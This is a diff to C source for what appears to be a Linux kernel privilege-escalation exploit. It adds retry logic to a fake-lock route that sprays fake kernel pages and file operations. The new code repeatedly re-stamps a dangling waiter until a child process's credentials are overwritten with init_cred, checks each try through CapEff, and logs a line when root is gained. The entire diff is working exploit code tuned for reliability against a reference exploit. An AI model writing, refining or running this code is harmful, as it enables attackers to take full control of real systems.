@@ -1747,7 +1747,13 @@ void do_pselect_fake_lock_route(void) {
   int sc = env_flag("MODE4_STATIC_CHAIN", 0);
   int vs_retries = 0; /* reclaim-loss retries consumed by VERIFY_SWAP */
   const int VS_MAX_RECLAIM_RETRIES = 4;
-  int max_att = env_flag("MODE4_SC_UMASK", 0) ? 3 : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
+  int cred_mode = env_flag("MODE4_SLIDE_CRED", 0) && g_uid0_child_pid > 0;
+  int oracle_mode = env_flag("MODE4_SLIDE", 0) &&
+                    !env_flag("MODE4_SLIDE_SWAP", 0) && g_bootid_before[0];
+  int max_att = (cred_mode || oracle_mode)
+                    ? env_int_range("LANDING_RETRY_ATTEMPTS", 12, 1, 24)
+      : env_flag("MODE4_SC_UMASK", 0) ? 3
+      : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
                    : (pad3 ? 3
                           : (zio || chain ? 3
                                          : ((zion || zi || wion)
@@ -1786,8 +1792,11 @@ void do_pselect_fake_lock_route(void) {
     }
     if (route_attempt != 1) {
       int reuse_page =
-          (sc || vs || chain || zion || zi || wion || zio || pad3) &&
-          route_attempt >= 2 && page_base && fake_fops;
+          ((sc || vs || chain || zion || zi || wion || zio || pad3) &&
+           route_attempt >= 2 && page_base && fake_fops) ||
+          cred_mode || oracle_mode; /* SLIDE_CRED/SLIDE re-stamp the SAME
+                      * BSS overlay — never re-spray between checked
+                      * attempts. */
       if (!reuse_page) {
         page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
         if (!page_base || !fake_lock || !fake_fops) {
@@ -2002,11 +2011,53 @@ void do_pselect_fake_lock_route(void) {
                 fake_fops);
         route_verified = 1;
       } else if (pselect_custom_write_enabled()) {
-        cfi_last_step = 0;
-        cfi_last_errno = 0;
-        route_verified = 1;
-        if (active_offsets && active_offsets->off_system_unbound_wq &&
-            !root_child_done) {
+        if (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0) &&
+            g_bootid_before[0]) {
+          /* oracle landing-checked retry: boot_id changes iff the redirect
+           * store landed (QEMU-verifiable; same re-stamp mechanics as the
+           * cred punch). */
+          if (bootid_changed()) {
+            cfi_last_step = 0;
+            route_verified = 1;
+            pr_info("ORACLE LANDED attempt=%d/%d\n", route_attempt, max_att);
+            live_sync_log("WP", "oracle_landed");
+            durable_proof_log("oracle_LANDED");
+          } else {
+            pr_info("oracle store miss attempt=%d/%d - re-stamp\n",
+                    route_attempt, max_att);
+            live_sync_log("WP", "oracle_punch_miss");
+          }
+        } else if (env_flag("MODE4_SLIDE_CRED", 0) && g_uid0_child_pid > 0) {
+          /*
+           * LANDING-CHECKED RETRY (PCKM00 lesson, 08-30): single-attempt
+           * cred punches landed only ~1-in-5 (6 verified misses, CapEff
+           * diagnostic). The reference exploit reaches ~97% by re-stamping
+           * the SAME dangling waiter up to 24x with rotating delays and a
+           * per-attempt verification. Our landing signal: the child's
+           * CapEff flips nonzero when *cred=init_cred lands. Miss ->
+           * route_verified stays 0 -> the loop re-stamps with the next
+           * delay in the rotation.
+           */
+          g_uid0_cred_landed = uid0_child_capeff_landed();
+          if (g_uid0_cred_landed) {
+            cfi_last_step = 0;
+            cfi_last_errno = 0;
+            route_verified = 1;
+            pr_info("CRED LANDED attempt=%d/%d\n", route_attempt, max_att);
+            live_sync_log("UID0", "cred_landed");
+            durable_proof_log("uid0_cred_LANDED");
+          } else {
+            pr_info("cred punch miss attempt=%d/%d - re-stamp next delay\n",
+                    route_attempt, max_att);
+            live_sync_log("UID0", "cred_punch_miss");
+          }
+        } else {
+          cfi_last_step = 0;
+          cfi_last_errno = 0;
+          route_verified = 1;
+        }
+        if (route_verified && active_offsets &&
+            active_offsets->off_system_unbound_wq && !root_child_done) {
           try_cfi_stage();
         }
       } else if (try_cfi_stage()) {
